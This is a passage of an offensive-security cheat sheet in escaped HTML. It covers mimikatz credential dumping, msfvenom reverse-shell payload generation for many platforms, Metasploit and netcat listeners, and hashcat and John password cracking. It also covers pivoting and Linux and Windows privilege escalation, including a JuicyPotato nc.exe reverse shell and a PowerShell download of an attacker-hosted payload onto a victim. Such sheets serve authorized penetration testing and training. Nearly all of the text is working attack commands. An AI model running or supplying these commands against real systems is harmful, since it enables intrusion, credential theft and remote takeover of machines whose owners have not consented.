\u002Fexport\n\nvault::cred\nvault::list\n\nlsadump::sam\nlsadump::secrets\nlsadump::cache\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"miscellaneous\"\u003EMISCELLANEOUS\u003C\u002Fh2\u003E\n\u003Ch3 id=\"get-a-windows-path-without-spaces\"\u003EGet a Windows path without spaces\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# path.cmd\n@echo off\necho %~s1\n\npath.cmd \"C:\\Program Files (x86)\\Common Files\\test.txt\"\nC:\\PROGRA~2\\COMMON~1\\test.txt -\u003E Valid path without spaces\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"msfvenom-payload\"\u003EMSFVENOM PAYLOAD\u003C\u002Fh2\u003E\n\u003Ch3 id=\"linux-3\"\u003ELinux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p linux\u002Fx86\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f elf \u003E shell.elf\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"windows-3\"\u003EWindows\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f exe \u003E shell.exe\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"php\"\u003EPHP\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p php\u002Freverse_php LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f raw \u003E shell.php\n\nThen we need to add the \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003E?php\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eat\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ethe\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Efirst\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eline\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eof\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ethe\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Efile\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eso\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ethat\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eit\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ewill\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eexecute\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eas\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ea\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003EPHP\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ewebpage\u003C\u002Fspan\u003E\n\u003Cspan class=\"token attr-name\"\u003Ecat\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eshell.php\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E|\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Epbcopy\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E&amp;&amp;\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eecho\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E'&lt;?php\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E'\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E|\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etr\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E-d\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003E'\\n'\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E shell.php &amp;&amp; pbpaste \u003E\u003E shell.php\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"asp\"\u003EASP\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f asp \u003E shell.asp\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"jsp\"\u003EJSP\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f raw \u003E shell.jsp\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"war\"\u003EWAR\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f war \u003E shell.war\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"python\"\u003EPython\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p cmd\u002Funix\u002Freverse_python LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f raw \u003E shell.py\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"bash\"\u003EBash\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p cmd\u002Funix\u002Freverse_bash LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f raw \u003E shell.sh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"perl\"\u003EPerl\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emsfvenom -p cmd\u002Funix\u002Freverse_perl LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f raw \u003E shell.pl\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"listener\"\u003EListener\u003C\u002Fh3\u003E\n\u003Ch4 id=\"metasploit\"\u003EMetasploit\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Euse exploit\u002Fmulti\u002Fhandler\nset PAYLOAD \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPAYLOAD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nset LHOST \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ELHOST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nset LPORT \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ELPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nset ExitOnSession false\nexploit -j -z\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"netcat\"\u003ENetcat\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"password-cracking\"\u003EPASSWORD CRACKING\u003C\u002Fh2\u003E\n\u003Ch3 id=\"online\"\u003EOnline\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EDecrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes\nhttps:\u002F\u002Fhashes.com\u002Fen\u002Fdecrypt\u002Fhash\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"hashcat\"\u003EHashcat\u003C\u002Fh3\u003E\n\u003Ch4 id=\"linux-password\"\u003ELinux password\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehashcat -m 1800 -a 0 hash.txt rockyou.txt\nhashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"windows-password\"\u003EWindows password\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehashcat -m 1000 -a 0 hash.txt rockyou.txt\nhashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"others\"\u003EOthers\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehashcat --example-hashes | grep -i '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EBEGINNING_OF_HASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E'\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"rules\"\u003ERules\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002FNotSoSecure\u002Fpassword_cracking_rules\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"john\"\u003EJohn\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ejohn --wordlist=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E hash.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"pivoting\"\u003EPIVOTING\u003C\u002Fh2\u003E\n\u003Ch3 id=\"sshuttle\"\u003ESshuttle\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esshuttle \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP_OF_THE_INTERFACE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCIDR\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"proxychains\"\u003EProxychains\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Essh -f -N -D 9050 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nproxychains \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ECOMMAND\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"interesting-link\"\u003EInteresting link\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fartkond.com\u002F2017\u002F03\u002F23\u002Fpivoting-guide\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"privile-escalation\"\u003EPRIVILE ESCALATION\u003C\u002Fh2\u003E\n\u003Ch3 id=\"linux-4\"\u003ELinux\u003C\u002Fh3\u003E\n\u003Ch4 id=\"enumeration-scripts\"\u003EEnumeration scripts\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ebash LinEnum.sh\nbash lse.sh -l 1\nbash linpeas.sh\npython linuxprivchecker.py\n.\u002Funix-privesc-check standard\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"vulnerability-scan\"\u003EVulnerability scan\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eperl les2.pl\nbash les.sh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"suid-checker\"\u003ESuid checker\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epython suid3num.py\n\nhttps:\u002F\u002Fgtfobins.github.io\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"methodology-to-follow\"\u003EMethodology to follow\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fguif.re\u002Flinuxeop\nhttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Fblob\u002Fmaster\u002FMethodology%20and%20Resources\u002FLinux%20-%20Privilege%20Escalation.md\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esudo -l\nKernel Exploits\nOS Exploits\nPassword reuse (mysql, .bash_history, 000- default.conf...)\nKnown binaries with suid flag and interactive (nmap)\nCustom binaries with suid flag either using other binaries or with command execution\nWritable files owned by root that get executed (cronjobs)\nMySQL as root\nVulnerable services (chkrootkit, logrotate)\nWritable \u002Fetc\u002Fpasswd\nReadable .bash_history\nSSH private key\nListening ports on localhost\n\u002Fetc\u002Ffstab\n\u002Fetc\u002Fexports\n\u002Fvar\u002Fmail\nProcess as other user (root) executing something you have permissions to modify\nSSH public key + Predictable PRNG\napt update hooking (PreInvoke)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"windows-4\"\u003EWindows\u003C\u002Fh3\u003E\n\u003Ch4 id=\"enumeration-scripts-1\"\u003EEnumeration scripts\u003C\u002Fh4\u003E\n\u003Ch5 id=\"general-scans\"\u003EGeneral scans\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\nwindows-privesc-check2.exe\nSeatbelt.exe -group=all\npowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\nPowerless.bat\nwinPEAS.bat\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"search-for-cve\"\u003ESearch for CVE\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esysteminfo \u003E systeminfo.txt\npython windows-exploit-suggester.py --update\npython windows-exploit-suggester.py --database \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDATE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E-mssb.xlsx --systeminfo systeminfo.txt\n\nsysteminfo \u003E systeminfo.txt\nwmic qfe \u003E qfe.txt\npython wes.py -u\npython wes.py systeminfo.txt qfe.txt\n\npowershell -exec bypass -command \"&amp; { Import-Module .\\Sherlock.ps1; Find-AllVulns; }\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"post-exploitation\"\u003EPost exploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Elazagne.exe all\nSharpWeb.exe\nmimikatz.exe\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"juicypotato-seimpersonate-or-seassignprimarytoken\"\u003EJuicyPotato (SeImpersonate or SeAssignPrimaryToken)\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EIf the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.\n\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"\u002Fc nc.exe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -e c:\\windows\\system32\\cmd.exe\" -t *\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"\u002Fc nc.exe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -e c:\\windows\\system32\\cmd.exe\" -t * -c \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ECLSID\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# CLSID\nhttps:\u002F\u002Fgithub.com\u002Fohpe\u002Fjuicy-potato\u002Fblob\u002Fmaster\u002FCLSID\u002FREADME.md\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"methodology-to-follow-1\"\u003EMethodology to follow\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fguif.re\u002Fwindowseop\nhttps:\u002F\u002Fpentest.blog\u002Fwindows-privilege-escalation-methods-for-pentesters\u002F\nhttps:\u002F\u002Fmysecurityjournal.blogspot.com\u002Fp\u002Fclient-side-attacks.html\nhttp:\u002F\u002Fwww.fuzzysecurity.com\u002Ftutorials\u002F16.html\nhttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Fblob\u002Fmaster\u002FMethodology%20and%20Resources\u002FWindows%20-%20Privilege%20Escalation.md\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"autorun\"\u003EAutorun\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for modifiable registry autoruns and configs...\n\nKey            : HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\My Program\nPath           : \"C:\\Program Files\\Autorun Program\\program.exe\"\nModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\\Program Files\\Autorun Program\\program.exe; IdentityReference=Everyone}\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\n\n[+] Autorun Applications(T1010)\n    Folder: C:\\Program Files\\Autorun Program\n    File: C:\\Program Files\\Autorun Program\\program.exe\n    FilePerms: Everyone [AllAccess]\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f exe \u003E program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\ncd C:\\Program Files\\Autorun Program\\\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fprogram.exe', '.\\program.exe')\n\nTo execute it with elevated privileges we need to wait for someone in the Admin group to login.\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 